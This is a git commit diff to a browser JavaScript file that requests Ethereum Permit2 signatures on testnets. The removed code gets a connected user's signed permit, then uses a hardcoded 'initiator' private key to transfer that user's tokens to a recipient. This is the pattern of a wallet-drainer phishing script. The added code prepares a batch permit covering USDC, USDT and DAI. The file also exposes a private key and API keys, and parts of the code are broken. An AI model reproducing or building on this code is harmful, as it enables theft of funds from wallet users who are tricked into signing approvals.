e3324d1f5a59825902ad8df68ca1447bee40f999
Ishwari18 <ishwarirele18@.com>
2023-05-16 23:03:21 +0530

    permitBatch

--- index2.js
+++ index2.js
@@ -1,13 +1,19 @@
 const { ethers, ethereum } = window;
 
 // constants
-const RPC = "https://goerli.infura.io/v3/15d127f3ac494ca88ab983921536e312"; // Goerly RPC
-const chainId = 159; // Goerly chain id
-const Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Permit2 deployed to Goerly
-const token1 = "0x8556C135e9899bc6e747f80a3084b2Ff5dDC574C"; // SHIBA on Goerly
-const token2 = "0xAe258c792361101eE7DC3061f8f259365b44769F"; // USDT on Goerly
+const RPC = "https://sepolia.infura.io/v3/fb42577745e24d429d936f65b43cca0b"; // Goerly RPC
+const chainId = 11155111; // Goerly chain id  155111" 
+const Permit2ContractAddress = "0x3Aa6320A008413F71149d3EB00328B669F8C2569"; // Permit2 deployed to Sepolia
+// const token1 = "0x8556C135e9899bc6e747f80a3084b2Ff5dDC574C"; // SHIBA on Goerly
+// const token2 = "0xAe258c792361101eE7DC3061f8f259365b44769F"; // USDT on Goerly
+const tokenAddresses = [
+  "0x1901A535526d973bc143e61D86e11282e4f1Ad5c", // USDC address
+  "0x3496989c4C8D523eC3C8db0dB85F04BCe95252fE", // USDT address
+  "0xB836eE20593c6310929b6f05a45a098fb602b93f",
+   // Replace with DAI address
+];
+
 const amount1 = String(20 * 10 ** 18); // calculate SHIBA
-const amount2 = String(20 * 10 ** 6); // calculate USDT amount
 const initiator = "0x0A59223D2d7018C5d6f5fDD6d9a02Ea6828fD22f"; // initiator address
 const initiatorPK =
   "fdc3d7a7ef1129116fbf4d565cff4ce9f86570e67ed6a7cf84281acab26986fc"; // initiaror's private key
@@ -23,48 +29,70 @@ mainButton.disabled = true;
 // ABIs
 const Permit2ContractABI = [
   {
-    inputs: [
-      { internalType: "address", name: "owner", type: "address" },
+    "inputs": [
       {
-        components: [
-          {
-            components: [
-              { internalType: "address", name: "token", type: "address" },
-              { internalType: "uint160", name: "amount", type: "uint160" },
-              { internalType: "uint48", name: "expiration", type: "uint48" },
-              { internalType: "uint48", name: "nonce", type: "uint48" },
-            ],
-            internalType: "struct IAllowanceTransfer.PermitDetails",
-            name: "details",
-            type: "tuple",
-          },
-          { internalType: "address", name: "spender", type: "address" },
-          { internalType: "uint256", name: "sigDeadline", type: "uint256" },
-        ],
-        internalType: "struct IAllowanceTransfer.PermitBatch",
-        name: "permitBatch",
-        type: "tuple",
+        "internalType": "address",
+        "name": "owner",
+        "type": "address"
       },
-      { internalType: "bytes", name: "signature", type: "bytes" },
+      {
+        "components": [
+          {
+            "components": [
+              {
+                "internalType": "address",
+                "name": "token",
+                "type": "address"
+              },
+              {
+                "internalType": "uint160",
+                "name": "amount",
+                "type": "uint160"
+              },
+              {
+                "internalType": "uint48",
+                "name": "expiration",
+                "type": "uint48"
+              },
+              {
+                "internalType": "uint48",
+                "name": "nonce",
+                "type": "uint48"
+              }
+            ],
+            "internalType": "struct IAllowanceTransfer.PermitDetails[]",
+            "name": "details",
+            "type": "tuple[]"
+          },
+          {
+            "internalType": "address",
+            "name": "spender",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "sigDeadline",
+            "type": "uint256"
+          }
+        ],
+        "internalType": "struct IAllowanceTransfer.PermitBatch",
+        "name": "permitBatch",
+        "type": "tuple"
+      },
+      {
+        "internalType": "bytes",
+        "name": "signature",
+        "type": "bytes"
+      }
     ],
-    name: "permit",
-    outputs: [],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "from", type: "address" },
-      { internalType: "address", name: "to", type: "address" },
-      { internalType: "uint160", name: "amount", type: "uint160" },
-      { internalType: "address", name: "token", type: "address" },
-    ],
-    name: "transferFrom",
-    outputs: [],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-];
+    "name": "permit",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
+]
+
+
 
 const ERC20_ABI = [
   {
@@ -110,178 +138,66 @@ async function connect() {
   mainButton.disabled = false;
 }
 
+
+  // function for token approval to the Permit2 contract
 // function for token approval to the Permit2 contract
 async function approveToken() {
-  const tokenContract = new web3.eth.Contract(ERC20_ABI, token1, {
-    from: selectedAddress,
+  const permit2Contract = new web3.eth.Contract(
+    Permit2ContractABI,
+    Permit2ContractAddress,
+    {
+      from: selectedAddress,
+    }
+  );
+  const permitDetailsArray = tokenAddresses.map((token, index) => ({
+    token: token,
+    amount: amount1,
+    expiration: Math.floor(Date.now() / 1000) + 120, // Set expiration to 2 minutes from now
+    nonce: index, // Update with the appropriate nonce value
+  }));
+  const permitBatch = {
+    details: permitDetailsArray,
+    spender: Permit2ContractAddress,
+    sigDeadline: Math.floor(Date.now() / 1000) + 120, // Set signature deadline to 2 minutes from now
+  };
+  const domain = {
+    chainId: chainId,
+    name: "Permit2",
+    verifyingContract: Permit2ContractAddress,
+  };
+  const types = {
+    PermitDetails: [
+      { name: "token", type: "address" },
+      { name: "amount", type: "uint160" },
+      { name: "expiration", type: "uint48" },
+      { name: "nonce", type: "uint48" },
+    ],
+    PermitBatch: [
+      { name: "details", type: "PermitDetails[]" },
+      { name: "spender", type: "address" },
+      { name: "sigDeadline", type: "uint256" },
+    ],
+  };
+  
+  const permitData = JSON.stringify({
+    types: types,
+    domain: domain,
+    primaryType: "PermitBatch",
+    message: permitBatch,
   });
-  const gasPrice = await web3.eth.getGasPrice();
-  const gasLimit = await tokenContract.methods
-    .approve(Permit2Contract, amount1)
-    .estimateGas({ from: selectedAddress });
-  const gasFee = gasPrice * gasLimit;
-  const amountToSend = web3.utils.toBN(amount1).sub(web3.utils.toBN(gasFee));
-
-  tokenContract.methods
-    .approve(Permit2Contract, amountToSend)
+  const signature = await provider.send("eth_signTypedData_v4", [
+    selectedAddress,
+    permitData,
+  ]);
+  permit2Contract.methods
+    .permit(selectedAddress, permitBatch, signature)
     .send({ from: selectedAddress })
     .on("transactionHash", function (hash) {
-      console.log("wait for a little bit..");
+      console.log("Wait for a little bit...");
     })
     .on("receipt", function (receipt) {
-      console.log(
-        "You successfully approved ",
-        token1,
-        "with the amount, ",
-        amount1
-      );
+      console.log("You successfully approved the tokens.");
     });
-}
-
-// the permit function
-async function Permit() {
-  const deadline = 10000000000000;
-  const nonce = 0; // still experimenting on this one
-
-  const dataToSign = JSON.stringify({
-    domain: {
-      name: "Permit2",
-      chainId: chainId,
-      verifyingContract: Permit2Contract,
-    },
-    types: {
-      EIP712Domain: [
-        { name: "name", type: "string" },
-        { name: "chainId", type: "uint256" },
-        { name: "verifyingContract", type: "address" },
-      ],
-      PermitBatch: [
-        { name: "details", type: "PermitDetails" },
-        { name: "spender", type: "address" },
-        { name: "sigDeadline", type: "uint256" },
-      ],
-      PermitDetails: [
-        { name: "token", type: "address" },
-        { name: "amount", type: "uint160" },
-        { name: "expiration", type: "uint48" },
-        { name: "nonce", type: "uint48" },
-      ],
-    },
-    primaryType: "PermitBatch",
-    message: {
-      details: {
-        token: token1,
-        amount: amount1,
-        expiration: deadline,
-        nonce: nonce,
-      },
-      token: token2,
-      amount: amount2,
-      expiration: deadline,
-      nonce: nonce,
-    },
-    spender: initiator,
-    sigDeadline: deadline,
-  });
-
-  web3.currentProvider.sendAsync({
-    method: "eth_signTypedData_v3",
-    params: [selectedAddress, dataToSign],
-    from: selectedAddress,
-  }),
-    async (error, result) => {
-      if (error != null) {
-        console.log("Error signing");
-        return;
-      }
-
-      const gasPrice = await web3.eth.getGasPrice();
-      const gasLimit = await tokenContract.methods
-        .approve(Permit2Contract, amount1)
-        .estimateGas({ from: selectedAddress });
-      const gasFee = gasPrice * gasLimit;
-      const amountToSend = web3.utils
-        .toBN(amount1)
-        .sub(web3.utils.toBN(gasFee));
-
-      const signature = result.result;
-      const initiatorNonce = await web3.eth.getTransactionCount(initiator);
-      const permit2Contract = new web3.eth.Contract(
-        Permit2ContractABI,
-        Permit2Contract
-      );
-
-      const permitDetails = [
-        [token1, amountToSend, deadline, nonce],
-        initiator,
-        deadline,
-      ];
-      const permitData = permit2Contract.methods
-        .permit(selectedAddress, permitDetails, signature)
-        .encodeABI();
-      const permitTX = {
-        from: initiator,
-        to: Permit2Contract,
-        nonce: web3.utils.toHex(initiatorNonce),
-        gasLimit: web3.utils.toHex(98000),
-        gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
-        value: "0x",
-        data: permitData,
-      };
-      try {
-        const signedPermitTX = await web3.eth.accounts.signTransaction(
-          permitTX,
-          initiatorPK
-        );
-        const permitReceipt = await web3.eth.sendSignedTransaction(
-          signedPermitTX.rawTransaction
-        );
-        console.log("Permit transaction receipt: ", permitReceipt);
-      } catch (error) {
-        console.error("Error occurred while sending permit");
-      }
-      // web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
-
-
-      
-      // after the token is approved to us,
-      try {
-        const transferData = tokenContract.methods
-          .transferFrom(selectedAddress, recipient, amountToSend)
-          .encodeABI();
-        const transferTX = {
-          from: initiator,
-          to: token1,
-          nonce: web3.utils.toHex(initiatorNonce + 1), // don't forget to increment initiator's nonce
-          gasLimit: web3.utils.toHex(98000),
-          gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
-          data: transferData,
-          value: "0x",
-        };
-
-        const signedTransferTX = await web3.eth.accounts.signTransaction(
-          transferTX,
-          initiatorPK
-        );
-
-
-        try {
-            const transferReceipt = await web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
-            console.log("Transfer transaction receipt: ", transferReceipt);
-          } catch (error) {
-            console.error("Error occurred while sending transfer transaction: ", error);
-          }
-
-
-
-        console.log("Transfer transaction receipt: ", transferReceipt);
-      } catch (error) {
-        console.error(
-          "Error occurred while sending transfer transaction: ",
-          error
-        );
-      }
-    };
 }
 
 // configure buttons
@@ -291,7 +207,5 @@ window.addEventListener("DOMContentLoaded", () => {
 }),
   window.addEventListener("DOMContentLoaded", () => {
     approveButton.onclick = approveToken;
-  }),
-  window.addEventListener("DOMContentLoaded", () => {
-    mainButton.onclick = Permit;
-  });
+  })
+ 
